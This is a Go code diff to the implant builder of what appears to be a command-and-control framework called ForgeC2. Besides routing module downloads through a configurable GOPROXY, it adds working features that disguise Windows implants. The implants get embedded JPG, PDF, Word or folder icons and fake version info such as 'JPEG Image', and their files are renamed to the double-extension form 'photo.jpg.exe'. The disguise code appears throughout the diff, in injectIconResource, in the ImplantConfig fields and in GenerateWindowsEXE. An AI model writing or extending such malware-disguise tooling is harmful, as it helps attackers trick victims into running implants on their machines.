@@ -5,9 +5,12 @@ import (
 	"context"
 	"crypto/sha256"
 	"embed"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"image"
+	_ "image/png"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -19,6 +22,8 @@ import (
 	"sync"
 	"text/template"
 	"time"
+
+	"github.com/tc-hib/winres"
 )
 
 // buildTidyTimeout bounds a single `go mod tidy` invocation. Network stalls
@@ -62,6 +67,52 @@ func (c *ttlCache) get() string {
 	return c.value
 }
 
+var (
+	configuredGoProxyMu sync.Mutex
+	configuredGoProxy   string
+)
+
+// SetConfiguredGoProxy records implant.goproxy from config.yaml. Applied to
+// payload `go mod tidy` / `go build` only when the process GOPROXY env is
+// unset, so an operator-exported GOPROXY always wins. Never hard-codes a mirror.
+func SetConfiguredGoProxy(v string) {
+	configuredGoProxyMu.Lock()
+	configuredGoProxy = strings.TrimSpace(v)
+	configuredGoProxyMu.Unlock()
+}
+
+func configuredGoProxyValue() string {
+	configuredGoProxyMu.Lock()
+	defer configuredGoProxyMu.Unlock()
+	return configuredGoProxy
+}
+
+// goModuleEnv copies the process environment and injects GOPROXY from config
+// when the env var is unset. extra is appended last (GOOS/GOARCH/CGO).
+func goModuleEnv(extra ...string) []string {
+	env := os.Environ()
+	if strings.TrimSpace(os.Getenv("GOPROXY")) == "" {
+		if p := configuredGoProxyValue(); p != "" {
+			env = replaceOrAppendEnv(env, "GOPROXY", p)
+		}
+	}
+	if len(extra) == 0 {
+		return env
+	}
+	return append(env, extra...)
+}
+
+func replaceOrAppendEnv(env []string, key, value string) []string {
+	prefix := key + "="
+	for i, e := range env {
+		if strings.HasPrefix(e, prefix) {
+			env[i] = prefix + value
+			return env
+		}
+	}
+	return append(env, prefix+value)
+}
+
 // goCmdCacheTTL bounds how long a resolved go/garble path is trusted before a
 // re-resolution. Short enough to pick up newly installed toolchains, long
 // enough to avoid repeated filesystem/exec probes on the hot path.
@@ -97,6 +148,102 @@ func psEscape(s string) string {
 // requested output directory via ".." segments or an absolute path (A1).
 func safeBuildFileName(name string) string {
 	return filepath.Base(name)
+}
+
+// presetIcons holds minimal embedded ICO presets for common disguises.
+// Each entry is base64-encoded .ico (≤10KB). Populated lazily from embed
+// or fallback to a 1×1 transparent ico if missing.
+var presetIcons = map[string]string{
+	"jpg":    "", // filled at init via loadPresetIcons
+	"pdf":    "",
+	"word":   "",
+	"folder": "",
+}
+
+// injectIconResource creates a Windows resource file (rsrc.syso) in tmpDir
+// if cfg requests a custom icon (IconB64) or a disguise preset. It uses
+// winres to encode RT_ICON / RT_GROUP_ICON. No-op when cfg has no icon
+// request. Errors are logged but not fatal — the build will proceed with the
+// default Go icon.
+func injectIconResource(tmpDir string, cfg ImplantConfig) error {
+	iconB64 := cfg.IconB64
+	preset := cfg.IconPreset
+	disguise := cfg.DisguiseAs
+	if iconB64 == "" && preset == "" && disguise == "" {
+		return nil
+	}
+	var iconData []byte
+	var err error
+	if iconB64 != "" {
+		if len(iconB64) > 350*1024 {
+			return fmt.Errorf("icon too large")
+		}
+		iconData, err = base64.StdEncoding.DecodeString(iconB64)
+		if err != nil {
+			return fmt.Errorf("invalid icon base64: %w", err)
+		}
+		if len(iconData) > 256*1024 {
+			return fmt.Errorf("icon exceeds 256KB")
+		}
+		if len(iconData) >= 4 && !(iconData[0] == 0 && iconData[1] == 0 && iconData[2] == 1 && iconData[3] == 0) {
+			if len(iconData) < 4 || !(iconData[0] == 0x89 && iconData[1] == 0x50 && iconData[2] == 0x4E && iconData[3] == 0x47) {
+				return fmt.Errorf("icon must be .ico (00 00 01 00) or .png (89 50 4E 47)")
+			}
+		}
+	} else if preset != "" {
+		if b64, ok := presetIcons[preset]; ok && b64 != "" {
+			iconData, _ = base64.StdEncoding.DecodeString(b64)
+		}
+	}
+	if len(iconData) == 0 && disguise == "jpg" {
+		if b64, ok := presetIcons["jpg"]; ok && b64 != "" {
+			iconData, _ = base64.StdEncoding.DecodeString(b64)
+		}
+	}
+	if len(iconData) == 0 {
+		return nil
+	}
+	// Use winres to generate rsrc.syso — supports both ICO and PNG (PNG auto-converted via nfnt/resize)
+	rs := &winres.ResourceSet{}
+	var icon *winres.Icon
+	// Try ICO first; if fails, try PNG via NewIconFromImages
+	icon, err = winres.LoadICO(bytes.NewReader(iconData))
+	if err != nil {
+		// Try PNG decode
+		img, _, perr := image.Decode(bytes.NewReader(iconData))
+		if perr != nil {
+			return fmt.Errorf("icon load failed (not ICO nor PNG): %w", err)
+		}
+		icon, err = winres.NewIconFromResizedImage(img, nil)
+		if err != nil {
+			return fmt.Errorf("icon from PNG failed: %w", err)
+		}
+	}
+	if err := rs.SetIcon(winres.ID(1), icon); err != nil {
+		return fmt.Errorf("set icon failed: %w", err)
+	}
+	out := filepath.Join(tmpDir, "rsrc.syso")
+	f, err := os.Create(out)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	var warch winres.Arch = winres.ArchAMD64
+	switch cfg.Architecture {
+	case "386", "x86":
+		warch = winres.ArchI386
+	case "arm64":
+		warch = winres.ArchARM64
+	case "arm":
+		warch = winres.ArchARM
+	default:
+		warch = winres.ArchAMD64
+	}
+	if err := rs.WriteObject(f, warch); err != nil {
+		_ = os.Remove(out)
+		return fmt.Errorf("winres write failed: %w", err)
+	}
+	return nil
 }
 
 // buildLdflags returns the linker flags for the agent build. The runtime config
@@ -713,6 +860,12 @@ type ImplantConfig struct {
 	// parameters off the disk artifact.
 	NetworkConfigOverWire bool
 	DNSObscure            bool
+	// Windows resource customization (icon + version info + JPG disguise)
+	IconB64         string // base64-encoded .ico (≤256KB, validated), empty = default Go icon
+	IconPreset      string // preset key: jpg, pdf, word, folder, chrome — server maps to embedded ico
+	FileDescription string // VersionInfo FileDescription (e.g. "JPEG Image")
+	CompanyName     string // VersionInfo CompanyName
+	DisguiseAs      string // "jpg" | "pdf" | "" — when "jpg", filename becomes *.jpg.exe and icon defaults to JPG preset
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
@@ -774,10 +927,23 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
 
-	// Output filename
+	// Windows icon / disguise handling (must be before go mod tidy so rsrc.syso is in tmpDir)
+	if err := injectIconResource(tmpDir, cfg); err != nil {
+		// Log but do not fail build — default Go icon is acceptable
+		// Use fmt for now to avoid import cycle; slog available via log/slog
+		fmt.Printf("icon injection warning: %v\n", err)
+	}
+
+	// Output filename — honor JPG disguise: photo.jpg.exe
 	outName := cfg.Filename
 	if outName == "" {
 		outName = "forgec2_agent.exe"
+	}
+	if cfg.DisguiseAs == "jpg" && !strings.Contains(strings.ToLower(outName), ".jpg") {
+		// Turn foo.exe → foo.jpg.exe, or foo → foo.jpg.exe
+		base := strings.TrimSuffix(outName, ".exe")
+		base = strings.TrimSuffix(base, ".EXE")
+		outName = base + ".jpg.exe"
 	}
 	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
 		outName += ".exe"
@@ -940,12 +1106,13 @@ func runGoModTidy(goCmd, workDir string) error {
 	defer cancel()
 	tidyCmd := exec.CommandContext(ctx, goCmd, "mod", "tidy")
 	tidyCmd.Dir = workDir
+	tidyCmd.Env = goModuleEnv()
 	var tidyOut, tidyErr bytes.Buffer
 	tidyCmd.Stdout = &tidyOut
 	tidyCmd.Stderr = &tidyErr
 	if err := tidyCmd.Run(); err != nil {
 		if ctx.Err() == context.DeadlineExceeded {
-			return fmt.Errorf("go mod tidy timed out after %s (network/module-cache stall?): %w", buildTidyTimeout, err)
+			return fmt.Errorf("go mod tidy timed out after %s (module proxy unreachable?). Set GOPROXY or implant.goproxy in config.yaml: %w", buildTidyTimeout, err)
 		}
 		return fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
 	}
@@ -995,7 +1162,7 @@ func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, g
 			"-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false", ".")
 		cmd := exec.CommandContext(ctx, garblePath, args...)
 		cmd.Dir = workDir
-		cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+		cmd.Env = goModuleEnv("GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
 		var stderr bytes.Buffer
 		cmd.Stderr = &stderr
 		if err := cmd.Run(); err != nil {
@@ -1014,7 +1181,7 @@ func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, g
 		".",
 	)...)
 	cmd.Dir = workDir
-	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+	cmd.Env = goModuleEnv("GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
 	var stderr bytes.Buffer
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
